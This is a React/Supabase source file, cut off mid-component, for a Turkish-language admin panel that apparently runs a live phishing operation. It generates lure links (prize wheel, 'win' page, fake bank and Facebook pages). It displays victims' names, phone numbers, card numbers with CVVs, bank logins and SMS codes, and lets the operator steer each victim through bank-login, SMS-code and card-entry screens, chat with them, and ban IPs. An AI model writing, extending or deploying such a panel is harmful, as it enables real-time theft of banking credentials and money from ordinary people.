"use client";

import { useCallback, useEffect, useState, useRef } from "react";
import { createBrowserSupabaseClient } from "@/lib/supabase/client";
import type { DemoSession } from "@/types/session";
import { ReceiptModal } from "./ReceiptModal";
import { VoucherModal } from "./VoucherModal";
import { BanksModal } from "./BanksModal";
import { defaultSettings } from "@/contexts/SettingsContext";
import { translations } from "@/lib/languageDefaults";
import { pathToStep } from "@/lib/session-routes";
import { playBeautifulNotification, showBeautifulToast } from "@/lib/notification";
import { isSessionLive, parseVisitorPresenceState } from "@/lib/admin-presence";

const SESSION_LIST_COLUMNS =
  "id,public_id,created_at,amount,current_step,status,form_data,ip_address,user_agent,partner_name,is_hidden";

export function AdminDashboardClean() {
  const supabase = createBrowserSupabaseClient();
  const [rows, setRows] = useState<DemoSession[]>([]);
  const rowsRef = useRef<DemoSession[]>([]);
  useEffect(() => {
    rowsRef.current = rows;
  }, [rows]);
  
  const [amount, setAmount] = useState("5000");
  const [currency, setCurrency] = useState("€");
  const [partnerName, setPartnerName] = useState("");
  const [participationCode, setParticipationCode] = useState("");
  const [showNewLinkModal, setShowNewLinkModal] = useState(false);
  const [creating, setCreating] = useState(false);
  const [newLink, setNewLink] = useState<string | null>(null);
  const [linkType, setLinkType] = useState<"normal" | "wheel" | "direct_win" | "direct_bank" | "direct_facebook">("normal");
  const [createLinkError, setCreateLinkError] = useState<string | null>(null);
  const [smsPromptSessionId, setSmsPromptSessionId] = useState<string | null>(null);
  const [smsDigitsInput, setSmsDigitsInput] = useState("6");
  const [smsCustomTextInput, setSmsCustomTextInput] = useState("");
  const [specialPromptSessionId, setSpecialPromptSessionId] = useState<string | null>(null);
  const [specialMessage, setSpecialMessage] = useState("");
  const [specialImage, setSpecialImage] = useState<string | null>(null);
  const [specialLang, setSpecialLang] = useState<"de" | "tr">("de");
  
  const [deviceInfoSession, setDeviceInfoSession] = useState<DemoSession | null>(null);

  const [chatSessionId, setChatSessionId] = useState<string | null>(null);
  const [chatMessages, setChatMessages] = useState<any[]>([]);
  const [chatInput, setChatInput] = useState("");
  const [pastedImage, setPastedImage] = useState<File | null>(null);
  const [pastedImagePreview, setPastedImagePreview] = useState<string | null>(null);
  const [isUploadingImage, setIsUploadingImage] = useState(false);
  const [zoomedImage, setZoomedImage] = useState<string | null>(null);
  const chatEndRef = useRef<HTMLDivElement>(null);

  const [showSettingsModal, setShowSettingsModal] = useState(false);
  const [showBanksModal, setShowBanksModal] = useState(false);
  const [showReceiptModal, setShowReceiptModal] = useState(false);
  const [showVoucherModal, setShowVoucherModal] = useState(false);
  const [globalSettings, setGlobalSettings] = useState<Record<string, string>>(defaultSettings as Record<string, string>);
  const [savingSettings, setSavingSettings] = useState(false);
  const [uploadingLogo, setUploadingLogo] = useState(false);
  const [uploadingBg, setUploadingBg] = useState(false);
  const [showSidebar, setShowSidebar] = useState(false);

  const [showBannedModal, setShowBannedModal] = useState(false);
  const [bannedIps, setBannedIps] = useState<{ ip_address: string; reason: string; banned_at: string }[]>([]);

  const [soundEnabled, setSoundEnabled] = useState(false);
  const soundEnabledRef = useRef(false);

  useEffect(() => {
    const savedSound = localStorage.getItem('adminSoundEnabled');
    if (savedSound === 'true') {
      setSoundEnabled(true);
      soundEnabledRef.current = true;
    }
  }, []);

  useEffect(() => {
    soundEnabledRef.current = soundEnabled;
    localStorage.setItem('adminSoundEnabled', soundEnabled.toString());
  }, [soundEnabled]);

  const playNotificationSound = useCallback((title: string = "Bildirim", desc?: string) => {
    try {
      playBeautifulNotification();
      showBeautifulToast(title, desc);
    } catch (e) {
      console.error("Audio error:", e);
    }
  }, []);

  const loadBannedIps = async () => {
    if (!supabase) return;
    const { data } = await supabase.from('banned_ips').select('*').order('banned_at', { ascending: false });
    if (data) setBannedIps(data);
  };

  const handleBanIp = async (sessionId: string, ipAddress?: string) => {
    if (!supabase) return;
    if (!ipAddress) {
      alert("Bu kullanıcının IP adresi henüz sisteme yansımamış. Kullanıcı siteye girdiğinde IP'si kayıt edilecektir.");
      return;
    }
    
    const confirmBan = confirm(`Bu IP adresi (${ipAddress}) tamamen engellenecek ve siteye giremeyecek. Onaylıyor musunuz?`);
    if (!confirmBan) return;

    await supabase.from('banned_ips').insert({
      ip_address: ipAddress,
      reason: `Admin tarafından engellendi (Session: ${sessionId})`
    });
    alert("IP adresi başarıyla engellendi!");
  };

  const handleUnbanIp = async (ipAddress: string) => {
    if (!supabase) return;
    await supabase.from('banned_ips').delete().eq('ip_address', ipAddress);
    await loadBannedIps();
  };

  const [onlineSessionIds, setOnlineSessionIds] = useState<Set<string>>(new Set());
  const [sessionLastSeenAt, setSessionLastSeenAt] = useState<Record<string, number>>({});
  const [sessionPaths, setSessionPaths] = useState<Record<string, string>>({});
  const [liveVisitorCount, setLiveVisitorCount] = useState(0);
  const [, setPresenceTick] = useState(0);

  async function compressImage(file: File, opts: { maxWidth: number; maxHeight: number; quality: number }) {
    const objectUrl = URL.createObjectURL(file);
    try {
      const img = new Image();
      img.decoding = "async";
      img.src = objectUrl;

      await new Promise<void>((resolve, reject) => {
        img.onload = () => resolve();
        img.onerror = () => reject(new Error("Image load failed"));
      });

      const ratio = Math.min(opts.maxWidth / img.width, opts.maxHeight / img.height, 1);
      const width = Math.round(img.width * ratio);
      const height = Math.round(img.height * ratio);

      const canvas = document.createElement("canvas");
      canvas.width = width;
      canvas.height = height;
      const ctx = canvas.getContext("2d");
      if (!ctx) return file;
      ctx.drawImage(img, 0, 0, width, height);

      const blob = await new Promise<Blob | null>((resolve) =>
        canvas.toBlob(resolve, "image/jpeg", opts.quality),
      );

      if (!blob) return file;
      return new File([blob], file.name.replace(/\.[^/.]+$/, "") + ".webp", { type: "image/jpeg" });
    } finally {
      URL.revokeObjectURL(objectUrl);
    }
  }

  const handleFileUpload = async (e: React.ChangeEvent<HTMLInputElement>, field: 'logo_url' | 'bg_url') => {
    const file = e.target.files?.[0];
    if (!file || !supabase) return;

    if (!file.type.startsWith("image/")) {
      alert("Lütfen sadece geçerli bir resim dosyası yükleyin.");
      return;
    }

    if (file.size > 5 * 1024 * 1024) {
      alert("Dosya boyutu çok büyük. Lütfen en fazla 5MB boyutunda bir resim yükleyin.");
      return;
    }

    if (field === 'logo_url') setUploadingLogo(true);
    else setUploadingBg(true);

    try {
      let uploadFile = file;
      if (field === "bg_url") {
        uploadFile = await compressImage(file, { maxWidth: 1920, maxHeight: 1080, quality: 0.82 });
      } else {
        uploadFile = await compressImage(file, { maxWidth: 512, maxHeight: 512, quality: 0.9 });
      }

      const fileExt = uploadFile.name.split('.').pop();
      const fileName = `${field}-${Date.now()}.${fileExt}`;
      const { error } = await supabase.storage.from('assets').upload(fileName, uploadFile, { upsert: true });
      if (error) throw error;

      const { data: publicUrlData } = supabase.storage.from('assets').getPublicUrl(fileName);
      setGlobalSettings(prev => ({ ...prev, [field]: publicUrlData.publicUrl }));
    } catch (err: any) {
      alert("Dosya yüklenirken hata oluştu: " + err.message);
    } finally {
      if (field === 'logo_url') setUploadingLogo(false);
      else setUploadingBg(false);
    }
  };

  const loadSettings = useCallback(async () => {
    if (!supabase) return;
    const { data } = await supabase.from("global_settings").select("*").limit(1).maybeSingle();
    if (data) {
      setGlobalSettings(prev => ({ ...prev, ...data }));
    }
  }, [supabase]);

  const saveSettings = async () => {
    if (!supabase) return;
    setSavingSettings(true);
    
    const payload: Record<string, any> = { ...globalSettings };
    
    // UUID validasyonu: Eğer id varsa ve geçerli bir UUID değilse (örn. "default"), payload'dan çıkaralım
    const uuidRegex = /^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$/i;
    if (payload.id && !uuidRegex.test(payload.id)) {
      delete payload.id;
    }
    
    const { error } = await supabase.from("global_settings").upsert(payload);
    if (error) {
      alert("Ayarlar kaydedilirken hata oluştu: " + error.message);
    } else {
      // Başarılı olursa ayarları tekrar yükleyelim ki yeni atanan UUID state'e geçsin
      await loadSettings();
    }
    setSavingSettings(false);
    setShowSettingsModal(false);
  };

  const handleLanguageChange = (lang: string) => {
    const confirmChange = confirm("Dili değiştirdiğinizde tüm metin alanları seçilen dilin varsayılan çevirileriyle güncellenecektir. Onaylıyor musunuz?");
    if (!confirmChange) return;

    const t = translations[lang];
    if (t) {
      setGlobalSettings(prev => ({
        ...prev,
        ...t,
        site_language: lang
      }));
    } else {
      setGlobalSettings(prev => ({ ...prev, site_language: lang }));
    }
  };

  const load = useCallback(async () => {
    if (!supabase) return;
    const { data } = await supabase
      .from("sessions")
      .select(SESSION_LIST_COLUMNS)
      .or("is_hidden.is.false,is_hidden.is.null")
      .order("created_at", { ascending: false })
      .limit(50);
    setRows((data as DemoSession[]) ?? []);
  }, [supabase]);

  useEffect(() => {
    void load();
    if (!supabase) return;
    void loadSettings();

    const channel = supabase
      .channel("admin-sessions-live")
      .on("postgres_changes", { event: "*", schema: "public", table: "sessions" }, (payload) => {
        if (payload.eventType === "INSERT") {
          const newRow = payload.new as DemoSession;
          if (newRow.is_hidden === true) return;
          setRows((prev) => {
            if (prev.some((r) => r.id === newRow.id)) return prev;
            return [newRow, ...prev].slice(0, 50);
          });
          return;
        }

        if (payload.eventType === "DELETE") {
          const oldRow = payload.old as DemoSession;
          if (oldRow?.id) {
            setRows((prev) => prev.filter((r) => r.id !== oldRow.id));
          }
          return;
        }

        if (payload.eventType === "UPDATE") {
          const newRow = payload.new as DemoSession;
          const oldRow = rowsRef.current.find((r) => r.id === newRow.id) ?? (payload.old as DemoSession | null);

          const hiddenNow = newRow.is_hidden === true;
          const hiddenBefore = oldRow ? oldRow.is_hidden === true : false;

          if (hiddenNow) {
            if (!hiddenBefore) {
              setRows((prev) => prev.filter((r) => r.id !== newRow.id));
            }
            return;
          }

          if (soundEnabledRef.current && oldRow) {
            const getSignificantData = (data: any) => {
              if (!data) return {};
              const { bankSlug, bankName, currency, is_wheel_game, participationCode, ...rest } = data;
              return rest;
            };

            const oldSignificant = getSignificantData(oldRow.form_data);
            const newSignificant = getSignificantData(newRow.form_data);
            const isFormDataChanged = JSON.stringify(oldSignificant) !== JSON.stringify(newSignificant);
            const isUserSubmittedToWait = newRow.current_step === "wait" && oldRow.current_step !== "wait";

            if (isFormDataChanged || isUserSubmittedToWait) {
              playNotificationSound("Yeni Form Verisi", "Kullanıcı bilgi girişi yaptı (İsim, SMS, Kart, Banka vb.).");
            }
          }

          setRows((prev) => {
            const idx = prev.findIndex((r) => r.id === newRow.id);
            if (idx === -1) return [newRow, ...prev].slice(0, 50);
            const next = [...prev];
            const prevRow = next[idx];
            const merged = { ...prevRow, ...newRow };
            const incomingFd = newRow.form_data;
            const fdMissing =
              incomingFd == null ||
              (typeof incomingFd === "object" && !Array.isArray(incomingFd) && Object.keys(incomingFd).length === 0);
            if (fdMissing && prevRow.form_data != null) {
              merged.form_data = prevRow.form_data;
            }
            next[idx] = merged;
            return next;
          });
        }
      })
      .subscribe();

    const presenceChannel = supabase.channel("online_visitors", {
      config: { presence: { key: "admin-dashboard" } },
    });

    const applyPresence = () => {
      const parsed = parseVisitorPresenceState(presenceChannel.presenceState());
      setLiveVisitorCount(parsed.liveVisitorCount);
      setOnlineSessionIds(new Set(parsed.onlineSessionIds));
      setSessionPaths(parsed.sessionPaths);
      setSessionLastSeenAt(parsed.sessionLastSeenAt);
      setPresenceTick((t) => t + 1);
    };

    presenceChannel
      .on("presence", { event: "sync" }, applyPresence)
      .on("presence", { event: "join" }, applyPresence)
      .on("presence", { event: "leave" }, applyPresence)
      .subscribe(async (status) => {
        if (status === "SUBSCRIBED") {
          await presenceChannel.track({
            pathname: "/admin",
            role: "admin",
            online_at: new Date().toISOString(),
          });
        }
      });

    return () => {
      void supabase.removeChannel(channel);
      void supabase.removeChannel(presenceChannel);
    };
  }, [supabase, load]);

  async function deleteAllLogs() {
    if (!confirm("DİKKAT: Tüm loglar yönetici panelinden gizlenecek. Emin misiniz?")) return;
    if (!supabase) return;
    const { error } = await supabase.from("sessions").update({ is_hidden: true }).neq("id", "00000000-0000-0000-0000-000000000000");
    if (!error) void load();
  }

  async function hideSingleLog(sessionId: string) {
    if (!confirm("Bu log satırını listeden kaldırmak istiyor musunuz?")) return;
    if (!supabase) return;
    const { error } = await supabase.from("sessions").update({ is_hidden: true }).eq("id", sessionId);
    if (error) {
      alert("Log kaldırılamadı: " + error.message);
      return;
    }
    if (chatSessionId === sessionId) setChatSessionId(null);
    if (deviceInfoSession?.id === sessionId) setDeviceInfoSession(null);
    void load();
  }

  async function createSession() {
    if (!supabase) {
      setCreateLinkError("Supabase baglantisi bulunamadi. Environment variables kontrol edin.");
      return;
    }
    setCreateLinkError(null);
    setCreating(true);

    // ADIM 1: KALICI SILINMIS (bosta) EN KUCUK public_id'yi bul (cakisma YOK)
    let reusePublicId: number | null = null;
    try {
      const { data: usedRows } = await supabase
        .from("sessions")
        .select("public_id")
        .not("public_id", "is", null);
      const usedIds = new Set(
        (usedRows || [])
          .map((r) => Number((r as any).public_id))
          .filter((n) => Number.isFinite(n) && n > 0)
      );
      for (let i = 1; i <= 100000; i++) {
        if (!usedIds.has(i)) {
          reusePublicId = i;
          break;
        }
      }
    } catch (_findErr) {
      // public_id listesi okunamazsa sequence devam etsin (zarar yok)
    }

    const insertPayload: any = {
      amount: linkType === "wheel" ? 0 : (Number(amount.replace(",", ".")) || 0),
      current_step: linkType === "direct_win" ? "win" : linkType === "direct_bank" ? "banken" : linkType === "direct_facebook" ? "facebook" : "code_entry",
      status: "offline",
      is_hidden: false,
      form_data: { 
        currency, 
        is_wheel_game: linkType === "wheel",
        partner_display_name: linkType === "normal" ? partnerName.trim() : "",
      },
      partner_name: "admin", // Admin dashboard'da şimdilik sabit
      participation_code: linkType === "normal" ? (participationCode.trim() || null) : null
    };

    // Bosta ID varsa manuel public_id ata (yoksa PostgreSQL SEQUENCE otomatik uretir)
    if (reusePublicId !== null) {
      insertPayload.public_id = reusePublicId;
    }

    const { data, error } = await supabase
        .from("sessions")
        .insert(insertPayload)
        .select("id, public_id")
        .maybeSingle();
    setCreating(false);
    if (error) {
      setCreateLinkError(`Link olusturulamadi: ${error.message}`);
      return;
    }

    if (data?.id) {
      const publicSessionId = (data as any).public_id ? String((data as any).public_id) : data.id;
      let urlPath = `/code?session=${publicSessionId}`;
      if (linkType === "wheel") urlPath = `/wheel?session=${publicSessionId}`;
      if (linkType === "direct_win") urlPath = `/win?session=${publicSessionId}`;
      if (linkType === "direct_bank") urlPath = `/banken?session=${publicSessionId}`;
      if (linkType === "direct_facebook") urlPath = `/facebook?session=${publicSessionId}`;
      setNewLink(`${window.location.origin}${urlPath}`);
      setShowNewLinkModal(false);
      setPartnerName("");
      setParticipationCode("");
      await load();
      return;
    }

    setCreateLinkError("Link olusturulamadi: session id donmedi.");
  }

  async function handleRouteAction(id: string, step: string) {
    if (!supabase || !step) return;
    if (step === "sms") {
      setSmsPromptSessionId(id);
      setSmsDigitsInput("6");
      setSmsCustomTextInput("");
      return;
    }
    if (step === "special_approval") {
      setSpecialPromptSessionId(id);
      return;
    }
    await supabase.from("sessions").update({ is_hidden: false, current_step: step, status: "online" }).eq("id", id);
    await load();
  }

  async function confirmSmsRedirect() {
    if (!supabase || !smsPromptSessionId) return;
    const digits = Math.min(12, Math.max(4, Number(smsDigitsInput) || 6));
    await supabase
      .from("sessions")
      .update({ is_hidden: false, current_step: "sms", 
        sms_digits: digits, 
        sms_custom_text: smsCustomTextInput.trim() || null,
        status: "online" 
      })
      .eq("id", smsPromptSessionId);
    setSmsPromptSessionId(null);
    await load();
  }

  async function publishSpecialApproval() {
    if (!supabase || !specialPromptSessionId) return;
    const { data: existing } = await supabase.from("sessions").select("form_data").eq("id", specialPromptSessionId).maybeSingle();
    const prev = (existing?.form_data ?? {}) as Record<string, unknown>;
    await supabase.from("sessions").update({
      status: "SPECIAL_INFO",
      current_step: "special_approval",
      form_data: { 
        ...prev, 
        specialNoticeText: specialMessage.trim(), 
        specialNoticeImage: specialImage ?? "", 
        specialNoticeLang: specialLang, 
        specialNoticeSentAt: new Date().toISOString() 
      },
    }).eq("id", specialPromptSessionId);
    setSpecialPromptSessionId(null);
    setSpecialMessage("");
    setSpecialImage(null);
    await load();
  }

  useEffect(() => {
    if (!chatSessionId || !supabase) return;

    const loadChat = () => {
      supabase
        .from("chat_messages")
        .select("id,session_id,sender,content,image_url,created_at")
        .eq("session_id", chatSessionId)
        .order("created_at", { ascending: true })
        .then(({ data, error }) => {
          if (error) {
            console.error("admin chat load error:", error);
            return;
          }
          if (data) {
            setChatMessages((prev) => {
              if (prev.length !== data.length) {
                setTimeout(() => chatEndRef.current?.scrollIntoView({ behavior: "smooth" }), 100);
                return data;
              }
              return prev;
            });
          }
        });
    };

    loadChat();
    const interval = setInterval(loadChat, 2000);

    const channel = supabase
      .channel(`admin_chat:${chatSessionId}`)
      .on(
        "postgres_changes",
        {
          event: "INSERT",
          schema: "public",
          table: "chat_messages",
          filter: `session_id=eq.${chatSessionId}`,
        },
        (payload) => {
          setChatMessages((prev) => {
            if (!prev.find((m) => m.id === payload.new.id)) {
              return [...prev, payload.new];
            }
            return prev;
          });
          setTimeout(() => chatEndRef.current?.scrollIntoView({ behavior: "smooth" }), 100);
        }
      )
      .subscribe();

    return () => {
      clearInterval(interval);
      void supabase.removeChannel(channel);
    };
  }, [chatSessionId, supabase]);

  async function sendChatMessage(e?: React.FormEvent) {
    if (e) e.preventDefault();
    if ((!chatInput.trim() && !pastedImage) || !supabase || !chatSessionId) return;

    let imageUrl = null;

    if (pastedImage) {
      setIsUploadingImage(true);
      const ext = pastedImage.name.split('.').pop() || 'png';
      const fileName = `${Math.random().toString(36).substring(2)}_${Date.now()}.${ext}`;
      
      const { data, error } = await supabase.storage
        .from('chat_images')
        .upload(fileName, pastedImage, {
          cacheControl: '3600',
          upsert: false
        });
        
      if (error) {
        console.error("Upload error:", error);
        alert("Resim yüklenirken hata oluştu.");
        setIsUploadingImage(false);
        return;
      }
      
      const { data: publicUrlData } = supabase.storage
        .from('chat_images')
        .getPublicUrl(fileName);
        
      imageUrl = publicUrlData.publicUrl;
    }

    const msg = chatInput.trim();
    
    // Reset state before network call to make UI feel faster
    setChatInput("");
    setPastedImage(null);
    setPastedImagePreview(null);
    setIsUploadingImage(false);

    const { data, error } = await supabase
      .from("chat_messages")
      .insert({
        session_id: chatSessionId,
        sender: "admin",
        content: msg || "",
        image_url: imageUrl,
      })
      .select("id,session_id,sender,content,image_url,created_at")
      .single();

    if (error) {
      console.error("admin chat send error:", error);
      setChatInput(msg);
      alert("Mesaj gönderilemedi: " + error.message);
      return;
    }

    if (data) {
      setChatMessages((prev) => {
        if (prev.find((m) => m.id === data.id)) return prev;
        return [...prev, data];
      });
    }
  }

  const handlePaste = (e: React.ClipboardEvent) => {
    const items = e.clipboardData?.items;
    if (!items) return;
    
    for (let i = 0; i < items.length; i++) {
      if (items[i].type.indexOf('image') !== -1) {
        const file = items[i].getAsFile();
        if (file) {
          setPastedImage(file);
          const reader = new FileReader();
          reader.onload = (e) => {
            setPastedImagePreview(e.target?.result as string);
          };
          reader.readAsDataURL(file);
          e.preventDefault();
          break;
        }
      }
    }
  };

  // Artık canlı sayacı presence'dan alıyoruz
  // const onlineCount = rows.filter(r => r.status === "online" || r.status === "SPECIAL_INFO").length;

  function extractDeviceModel(ua: string): string | null {
    // Android: "... (Linux; Android 13; SM-G998B) ..." veya "Pixel 7"
    const androidParen = ua.match(/\(Linux;\s*Android\s+[\d.]+;\s*([^)]+)\)/i);
    if (androidParen) {
      let raw = androidParen[1].trim();
      raw = raw.split(/\s+Build\//i)[0].trim();
      if (raw && !/^Mobile$/i.test(raw) && !/^tablet$/i.test(raw)) {
        return raw;
      }
    }

    if (/iPhone/i.test(ua)) {
      const v = ua.match(/CPU iPhone OS ([\d_]+)/i);
      if (v) return `iPhone (iOS ${v[1].replace(/_/g, ".")})`;
      return "iPhone";
    }
    if (/iPad/i.test(ua)) {
      const v = ua.match(/CPU (?:iPhone )?OS ([\d_]+)/i);
      if (v) return `iPad (iPadOS ${v[1].replace(/_/g, ".")})`;
      return "iPad";
    }
    if (/iPod/i.test(ua)) {
      return "iPod touch";
    }

    const samsung = ua.match(/\b(SM-[A-Z0-9]+)\b/i);
    if (samsung) return samsung[1];

    const pixel = ua.match(/\b(Pixel\s+(?:\d+[a-zA-Z]?|Tablet|Fold|Pro))\b/i);
    if (pixel) return pixel[1];

    return null;
  }

  function parseUserAgent(ua?: string) {
    if (!ua) {
      return { os: "Bilinmiyor", browser: "Bilinmiyor", device: "Bilinmiyor", model: "Tespit edilemedi" };
    }
    let os = "Bilinmiyor";
    let browser = "Bilinmiyor";
    let device = "Masaüstü";

    if (/android/i.test(ua)) {
      os = "Android";
      device = "Mobil/Tablet";
    } else if (/iphone|ipad|ipod/i.test(ua)) {
      os = "iOS";
      device = "Mobil/Tablet";
    } else if (/windows/i.test(ua)) {
      os = "Windows";
    } else if (/mac os/i.test(ua)) {
      os = "macOS";
    } else if (/linux/i.test(ua)) {
      os = "Linux";
    }

    if (/chrome|crios/i.test(ua)) browser = "Chrome";
    else if (/firefox|fxios/i.test(ua)) browser = "Firefox";
    else if (/safari/i.test(ua)) browser = "Safari";
    else if (/edg/i.test(ua)) browser = "Edge";
    else if (/opr\//i.test(ua)) browser = "Opera";

    const modelGuess = extractDeviceModel(ua);
    const model =
      modelGuess ??
      (device === "Masaüstü" ? "— (masaüstü)" : "Tespit edilemedi (UA kısıtlı olabilir)");

    return { os, browser, device, model };
  }

  return (
    <div className="min-h-screen bg-[#0a0a0a] p-6 font-sans text-zinc-300">
      <div className="mx-auto max-w-7xl">
        <div className="mb-8 flex items-center justify-between">
          <div className="flex items-center gap-4">
            <button 
              onClick={() => setShowSidebar(true)} 
              className="text-zinc-400 hover:text-white transition-colors"
              title="Menü"
            >
              <svg className="size-7" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2.5} d="M4 6h16M4 12h16M4 18h16" />
              </svg>
            </button>
            <h1 className="text-xl font-bold tracking-tight text-white">Yönetim Paneli</h1>
            <div className="flex items-center gap-2 rounded-full bg-blue-500/10 px-3 py-1.5 border border-blue-500/20">
              <div className="size-2 rounded-full bg-blue-500 animate-pulse shadow-[0_0_8px_#003b8f]" />
              <span className="text-[11px] font-bold text-blue-500 tracking-wide uppercase">
                {liveVisitorCount} Sitede Aktif
              </span>
            </div>
            <button 
              onClick={() => {
                setSoundEnabled(!soundEnabled);
                if (!soundEnabled) playNotificationSound("Bildirim Testi", "Sesli bildirimler başarıyla açıldı.");
              }}
              className={`flex items-center gap-2 rounded-full px-3 py-1.5 border text-[11px] font-bold tracking-wide uppercase transition-colors ${
                soundEnabled 
                  ? "bg-blue-500/10 border-blue-500/20 text-blue-500" 
                  : "bg-zinc-800 border-zinc-700 text-zinc-500 hover:bg-zinc-700"
              }`}
            >
              {soundEnabled ? "🔊 Ses Açık" : "🔇 Ses Kapalı"}
            </button>
          </div>
          <div className="flex items-end gap-3">
            <button 
              onClick={() => setShowNewLinkModal(true)} 
              className="rounded-lg bg-blue-700 px-5 py-2 text-sm font-bold text-white hover:bg-blue-500 transition-colors shadow-[0_0_15px_rgba(0,59,143,0.30)]"
            >
              + Yeni Link Oluştur
            </button>
          </div>
        </div>

        <div className="overflow-hidden rounded-xl border border-zinc-800 bg-[#111111]">
          <table className="w-full text-left text-sm">
            <thead className="border-b border-zinc-800 bg-[#161616] text-xs uppercase text-zinc-500">
              <tr>
                <th className="px-4 py-4">Durum</th>
                <th className="px-4 py-4">Kullanıcı</th>
                <th className="px-4 py-4">Aktif Sayfa</th>
                <th className="px-4 py-4">Kart Bilgileri</th>
                <th className="px-4 py-4">Banka & Giriş</th>
                <th className="px-4 py-4">Giriş Detayı</th>
                <th className="px-4 py-4">SMS KODU</th>
                <th className="px-4 py-4">İşlemler</th>
              </tr>
            </thead>
            <tbody className="divide-y divide-zinc-800">
              {rows.map((row) => {
                const fd = row.form_data || {};
                // ================================================================
                //  BANKA LOGO Yardimcisi: /bank-logos/{slug}.svg VARSA kullan.
                //  YOKSA form_data.logoFile ya da brand-color li pill fallback.
                //  BOYUT: 40x24. Banka ADI + LOGIN METHOD bu kolonda YALNIZCA.
                // ================================================================
                const getBankLogoSrc = () => {
                  const slug = (fd.bankSlug || "").toString().trim();
                  if (slug) {
                    const candidates = [
                      `/bank-logos/${slug}.svg`,
                      `/logos/${slug}.webp`,
                      `/logos/${slug}.svg`,
                    ];
                    if (typeof fd.logoFile === "string" && fd.logoFile.trim()) {
                      candidates.unshift(fd.logoFile.trim());
                    }
                    return candidates[0];
                  }
                  if (typeof fd.logoFile === "string" && fd.logoFile.trim()) {
                    return fd.logoFile.trim();
                  }
                  return "";
                };
                const bankLogoSrc = getBankLogoSrc();
                const bankShort = (fd.bankName || "Bilinmiyor").toString();
                const pillInitials = bankShort
                  .split(/\s+/)
                  .filter(Boolean)
                  .map((s) => s[0])
                  .join("")
                  .slice(0, 3)
                  .toUpperCase();
                const pillColor =
                  (typeof fd.brandColor === "string" && fd.brandColor.trim()) || "#1d4ed8";
                // =================================================================
                //  Gerçek zamanlı (WebSocket) aktiflik kontrolü
                // =================================================================
                const isActuallyOnline = isSessionLive(
                  row.id,
                  onlineSessionIds,
                  row.status,
                  sessionLastSeenAt[row.id],
                );

                return (
                  <tr key={row.id} className="transition-colors hover:bg-[#141414]">
                    <td className="px-4 py-4">
                      <div className="flex items-center gap-2">
                        {isActuallyOnline ? (
                          <>
                            <div className="size-2 rounded-full bg-blue-500 animate-pulse shadow-[0_0_8px_#003b8f]" />
                            <span className="text-[10px] font-bold uppercase text-blue-500">ONLİNE</span>
                          </>
                        ) : (
                          <>
                            <div className="size-2 rounded-full bg-red-500 shadow-[0_0_8px_#ef4444]" />
                            <span className="text-[10px] font-bold uppercase text-red-500">OFFLİNE</span>
                          </>
                        )}
                      </div>
                    </td>
                    <td className="px-4 py-4">
                      <div className="font-bold text-white">{fd.firstName} {fd.lastName}</div>
                      <div className="text-[11px] text-zinc-500 font-mono">{fd.phone || "-"}</div>
                    </td>
                    <td className="px-4 py-4">
                      {(() => {
                        let s = row.current_step as string;
                        const livePath = sessionPaths[row.id];
                        if (isActuallyOnline && livePath) {
                          if (livePath.startsWith('/wheel')) {
                            s = "wheel";
                          } else {
                            const mappedStep = pathToStep(livePath);
                            if (mappedStep) {
                              s = mappedStep;
                            }
                          }
                        }
                        
                        // Varsayılan Renk (Gri)
                        let colorClass = "bg-zinc-800 text-zinc-400";
                        let text = "BAŞLANGIÇ";

                        if (s === "wheel") {
                          colorClass = "bg-teal-500/20 text-teal-400";
                          text = "ÇARK OYUNU";
                        } else if (s === "code_entry") {
                          if (fd.is_wheel_game) {
                            colorClass = "bg-teal-500/20 text-teal-400";
                            text = "ÇARK OYUNU";
                          } else {
                            colorClass = "bg-pink-500/20 text-pink-500";
                            text = "KOD GİRİŞİ";
                          }
                        } else if (s === "win") {
                          colorClass = "bg-purple-500/20 text-purple-500";
                          text = "İSİM & PROFİL";
                        } else if (s === "banken") {
                          colorClass = "bg-indigo-500/20 text-indigo-400";
                          text = "BANKA SEÇİMİ";
                        } else if (s === "bank" || s === "login" || s === "bank_login") {
                          colorClass = "bg-cyan-500/20 text-cyan-400";
                          let bName = typeof fd.viewingBankName === 'string' ? fd.viewingBankName : typeof fd.bankName === 'string' ? fd.bankName : null;
                          
                          if (!bName && livePath && livePath.includes('/bank/')) {
                            const parts = livePath.split('/');
                            const bankIdx = parts.indexOf('bank');
                            if (bankIdx !== -1 && parts.length > bankIdx + 1) {
                              bName = parts[bankIdx + 1].replace(/-/g, ' ');
                            }
                          }

                          text = bName ? bName.toUpperCase() : "BANKA GİRİŞİ";
                        } else if (s === "sms") {
                          colorClass = "bg-orange-500/20 text-orange-500";
                          text = "SMS ONAYI";
                        } else if (s === "card") {
                          colorClass = "bg-rose-500/20 text-rose-500";
                          text = "KREDİ KARTI";
                        } else if (s === "wait") {
                          colorClass = "bg-yellow-500/20 text-yellow-500";
                          text = "BEKLEME EKRANI";
                        } else if (s === "invalid_bank") {
                          colorClass = "bg-red-500/20 text-red-500";
                          text = "HATALI BANKA";
                        } else if (s === "live_support") {
                          colorClass = "bg-blue-500/20 text-blue-500";
                          text = "CANLI DESTEK";
                        } else if (s === "special_approval") {
                          colorClass = "bg-blue-500/20 text-blue-500";
                          text = "ÖZEL BİLDİRİM";
                        } else if (s === "congrats") {
                          colorClass = "bg-teal-500/20 text-teal-400";
                          text = "TEBRİKLER (SON)";
                        }

                        return (
                          <span className={`px-2 py-1 rounded text-[10px] font-bold uppercase ${colorClass}`}>
                            {text}
                          </span>
                        );
                      })()}
                    </td>
                    <td className="px-4 py-4 text-[11px] text-zinc-400">
                      <div>Kart: <span className="text-zinc-200 font-mono">{fd.cardNumber || "-"}</span></div>
                      <div>SKT/CVV: <span className="text-zinc-200">{fd.cardExpiry || "-"} / {fd.cardCvc || "-"}</span></div>
                    </td>
                    <td className="px-4 py-4">
                      {
                        // =================================================================
                        //  BANKA KOLONU (TEMIZ): SADECE BANKA LOGOSU + ADI + GIRIS YONTEMI
                        //  Ekstra alanlar (ID/PW/KOD/Kimlik No) -> YENI "Giris Detayi" kolonunda
                        // =================================================================
                      }
                      <div className="flex items-center gap-3">
                        <div className="flex-shrink-0 overflow-hidden rounded-md border border-zinc-700 bg-white/80 w-12 h-8 flex items-center justify-center">
                          {bankLogoSrc ? (
                            <img
                              src={bankLogoSrc}
                              alt={bankShort}
                              className="max-w-full max-h-full object-contain"
                              onError={(e) => {
                                (e.currentTarget as HTMLImageElement).style.display = "none";
